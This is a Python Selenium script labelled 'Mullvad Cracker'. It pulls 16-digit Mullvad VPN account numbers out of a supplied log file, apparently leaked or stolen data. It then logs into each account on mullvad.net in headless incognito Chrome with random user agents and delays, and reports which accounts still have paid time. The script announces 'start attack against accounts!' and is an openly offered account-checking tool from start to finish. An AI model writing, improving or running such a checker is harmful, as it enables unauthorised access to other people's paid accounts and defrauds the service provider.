from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import random
from fake_useragent import UserAgent
import re
import sys
from colorama import Fore, Style


banner = """
┳┳┓  ┓┓     ┓  ┏┓     ┓     
┃┃┃┓┏┃┃┓┏┏┓┏┫  ┃ ┏┓┏┓┏┃┏┏┓┏┓
┛ ┗┗┻┗┗┗┛┗┻┗┻  ┗┛┛ ┗┻┗┛┗┗ ┛ 

Mullvad Cracker                  
version: 1.0.0
made by love: RUSTY J0y
-------------------------------------------------------------
"""

print(banner)

ac_num = "/html/body/div/main/div/div/form/div/input"
login_btn = "/html/body/div/main/div/div/form/button"
account_h1 = "/html/body/div/main/section/div/aside/div[2]/h1"
service = Service(ChromeDriverManager().install(), log_path="NUL")
chrome_options = Options()
chrome_options.add_argument("--headless")  # اجرا بدون رابط گرافیکی
chrome_options.add_argument("--disable-extensions")  # غیرفعال کردن افزونه‌ها
chrome_options.add_argument("--disable-gpu")  # غیرفعال کردن شتاب سخت‌افزاری
chrome_options.add_argument("--no-sandbox")  # جلوگیری از مشکلات امنیتی
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument('GLOG_minloglevel')
driver = None

def login(accountNum):
    global driver
    driver.get("https://mullvad.net/en/account")
    try:
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, login_btn))
        )
    except TimeoutException:
        print(f"[X] page load failed / {accountNum}")
        return False
    
    account_num_element = driver.find_element(By.XPATH, ac_num)
    login_btn_element = driver.find_element(By.XPATH, login_btn)
    
    account_num_element.click()
    account_num_element.send_keys(accountNum)
    # account_num_element.clear()
    
    time.sleep(1)
    login_btn_element.click()

    try:
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, account_h1))
        )
        print(Fore.YELLOW + f"[O] login success / {accountNum}"+ Style.RESET_ALL)
        return True
    except TimeoutException:
        print(Fore.RED + f"[X] login failed / {accountNum}"+ Style.RESET_ALL)
        return False
        
def check_paid(accountNum):
    expiery_element = driver.find_element(By.CSS_SELECTOR, "[data-cy='account-expiry']")
    if expiery_element.text == "No time left":
        print(Fore.RED + f"[-] {accountNum} / {expiery_element.text}"+ Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[+] {accountNum} / {expiery_element.text}"+ Style.RESET_ALL)


def main_worker(account):
    global driver
    number = clean_numbers(account)
    ua = UserAgent()
    user_agent = ua.random 
    chrome_options = Options()
    chrome_options.add_argument("--force-device-scale-factor=0.5")  # 50% زوم
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument(f"--user-agent={user_agent}")
    chrome_options.add_argument("--disable-dev-shm-usage") 
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--headless")               # no chrome windows
    chrome_options.add_argument("--log-level=0")
    chrome_options.add_argument("--disable-logging")
    chrome_options.add_argument("--silent")

    driver = webdriver.Chrome(service= Service(log_output='NUL'), options=chrome_options)

    if login(number):
        check_paid(number)
        time.sleep(5)
    driver.quit()
    print('-------------------------------------------------------------')
    time.sleep(random.randint(5, 20))

def clean_numbers(array):
    for part in array:
        if len(part) == 16:
            return part

    allStr = result = "".join(array)
    if len(allStr) == 16:
        return allStr

    allStr2 = ""
    for part in array:
        if len(part) == 4:
            allStr2 += part
    if len(allStr2) == 16:
        return allStr2
    return ""
    
def extract_numbers(line: str) -> str:
    return clean_numbers(re.findall(r'\d+', line))

def read_muulvad_account_numbers(file_path):
    accounts = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            lowerLine = line.lower()
            if "mullvad" in lowerLine:
                num = extract_numbers(lowerLine)
                if num.isdigit():
                    print(f'Account found: {num}')
                    accounts.append(num)
    return accounts


if len(sys.argv[1]) < 2:
    print("[!] Please give me log-file-path in command line argument.")
    os.exit()

accounts = read_muulvad_account_numbers(sys.argv[1])

ln = len(accounts)

if ln == 0:
    print('[!] mullvad account not found!')
else:
    print(f'[*] {ln} accounts found!')

print('[*] start attack against accounts!')
for account in accounts:
    main_worker(account)

print('[ ] Done, GOOD LUCK :)')